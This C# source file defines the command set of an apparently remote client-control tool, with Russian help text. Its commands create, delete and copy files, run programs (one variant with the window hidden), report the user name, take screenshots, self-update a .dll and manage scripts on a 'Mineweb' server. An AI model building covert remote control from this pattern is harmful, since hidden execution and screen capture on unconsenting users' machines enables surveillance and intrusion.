// This code is licensed under the isc license. You can improve the code by keeping this comments 
// (or by any other means, with saving authorship by Zerumi and PizhikCoder retained)
namespace CommandsLibrary
{
    public class Arguments : IArgument
    {
        public string Command { get; set; }
        public int ArgumentCount { get; set; }
        public string[] ArgumentsList { get ; set; }
        public string[] ArgumentType { get; set; }
        public string CommandInfo { get; set; }
        public bool IsForServer { get; set; }

        public static IArgument[] arguments =
        {
            new Arguments()
            {
                Command = "/create",
                ArgumentCount = 1,
                ArgumentsList = new string[]
                {
                    "Путь к файлу\\Файл"
                },
                ArgumentType = new string[]
                {
                    "TextBox"
                },
                CommandInfo = "Создает файл по указанному пути на системе",
                IsForServer = false
            },
            new Arguments()
            {
                Command = "/createwrite",
                ArgumentCount = 2,
                ArgumentsList = new string[]
                {
                    "Путь к файлу\\Файл",
                    "Содержимое файла"
                },
                ArgumentType = new string[] 
                { 
                    "TextBox",
                    "TextBox" 
                },
                CommandInfo = "Создает файл по указанному пути на системе и записывает туда информацию",
                IsForServer = false
            },
            new Arguments()
            {
                Command = "/delete",
                ArgumentCount =  1,
                ArgumentsList = new string[]
                {
                    "Путь к файлу\\Файл"
                },
                ArgumentType = new string[]
                {
                    "TextBox",
                },
                CommandInfo = "Удаляет файл по указанному пути",
                IsForServer = false
            },
            new Arguments()
            {
                Command = "/copy",
                ArgumentCount = 2,
                ArgumentsList = new string[]
                {
                    "Путь к файлу\\Файл для копирования",
                    "Путь к файлу\\Файл для вставки"
                },
                ArgumentType = new string[] 
                {
                    "TextBox",
                    "TextBox"
                },
                CommandInfo = "Копирует файл из одного пути на системе в другой (поддерживается пересоздание)",
                IsForServer = false
            },
            new Arguments()
            {
                Command = "/start",
                ArgumentCount = 1,
                ArgumentsList = new string[]
                {
                    "Путь к файлу\\Файл"
                },
                ArgumentType = new string[]
                {
                    "TextBox" 
                },
                CommandInfo = "Запускает исполняемый файл на системе по указанному пути",
                IsForServer = false
            },
            new Arguments()
            {
                Command = "/startinvis",
                ArgumentCount = 1,
                ArgumentsList = new string[]
                {
                    "Путь к файлу\\Файл"
                },
                ArgumentType = new string[] 
                {
                    "TextBox" 
                },
                CommandInfo = "Запускает исполняемый файл на системе по указанному пути и пытается скрыть активное окно программы (не работает на всех программах)",
                IsForServer = false
            },
            new Arguments()
            {
                Command = "/nameofpc",
                ArgumentCount = 0,
                ArgumentsList = null,
                CommandInfo = "Возвращает имя активного пользователя системы",
                IsForServer = false
            },
            new Arguments()
            {
                Command = "/screen",
                ArgumentCount = 1,
                ArgumentsList = new string[]
                {
                    "Открыть скриншот панель"
                },
                ArgumentType = new string[] 
                {
                    "Button" 
                },
                CommandInfo = "Возвращает текущий снимок экрана на системе",
                IsForServer = false
            },
            new Arguments()
            {
                Command = "/update",
                ArgumentCount = 1,
                ArgumentsList = new string[]
                {
                    "Загрузить файл"
                },
                ArgumentType = new string[] 
                { 
                    "Button"
                },
                CommandInfo = "Загружает/Пересоздает в основную папку клиента загруженный вами файл (используется для обновления .dll)",
                IsForServer = false
            },
            new Arguments()
            {
                Command = "/minescript add",
                ArgumentCount = 2,
                ArgumentsList = new string[]
                {
                    "Путь к файлу на сервере",
                    "Загрузить файл"
                },
                ArgumentType = new string[]
                {
                    "TextBox",
                    "Button"
                },
                CommandInfo = "Добавляет скрипт на Mineweb сервер",
                IsForServer = true
            },
            new Arguments()
            {
                Command = "/minescript update",
                ArgumentCount = 2,
                ArgumentsList = new string[]
                {
                    "Путь к файлу на сервере",
                    "Загрузить файл"
                },
                ArgumentType = new string[]
                {
                    "TextBox",
                    "Button"
                },
                CommandInfo = "Обновляет скрипт с Mineweb сервера",
                IsForServer = true
            },
            new Arguments()
            {
                Command = "/minescript remove",
                ArgumentCount = 1,
                ArgumentsList = new string[]
                {
                    "Путь к файлу на сервере"
                },
                ArgumentType = new string[]
                {
                    "TextBox"
                },
                CommandInfo = "Удаляет скрипт с Mineweb сервера",
                IsForServer = true
            }
        };
    }
}
